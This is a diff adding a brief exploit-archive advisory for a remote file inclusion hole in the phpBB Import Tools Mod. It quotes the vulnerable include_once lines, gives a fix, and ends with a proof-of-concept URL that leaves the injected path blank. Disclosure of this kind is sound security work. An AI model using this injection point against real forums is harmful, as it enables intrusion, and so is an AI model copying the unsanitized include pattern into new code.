@@ -1,0 +1,25 @@
+#
+# *
+# * Title: phpBB Import Tools Mod <= 0.1.4 (phpbb_root_path) Remote File Inclusion
+# * Author/Discovery: boecke
+# * Vulnerability Type: Remote File Inclusion
+# * Risk: High Risk
+# * Software Affected: phpBB Import Tools Mod <= 0.1.4
+# *
+# * Literally shouts to: str0ke and henrik
+# * Don't promote Google-ism!
+# *
+#
+
+[ Vulnerable Code: ]
+include_once($phpbb_root_path . 'includes/functions_validate.' . $phpEx);
+include_once($phpbb_root_path . 'includes/functions_post.' . $phpEx);
+include_once($phpbb_root_path . 'includes/bbcode.' . $phpEx);
+
+[ Fix: ]
+Correctly sanitize these variables before their use or deny direct access to the script.
+
+[ Proof of Concept: ]
+http://localhost/phpBB2/includes/functions_mod_user.php?phpbb_root_path=
+
+# milw0rm.com [2006-10-12]
